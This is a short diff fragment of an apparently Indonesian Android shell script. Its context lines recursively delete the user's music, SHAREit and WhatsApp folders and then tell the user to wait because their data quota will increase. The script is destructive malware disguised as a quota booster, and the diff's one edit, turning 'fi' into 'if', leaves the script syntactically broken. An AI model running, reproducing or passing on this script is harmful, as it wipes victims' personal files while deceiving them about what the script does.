@@ -48,4 +48,4 @@ rm -rf storage/emulated/0/Mymusic
 rm -rf storage/emulated/0/SHAREit
 rm -rf storage/emulated/0/WhatsApp
 echo  $blue "Tunggu Beberapa Menit , Nanti Kouta Akan Bertambah"
-fi
+if
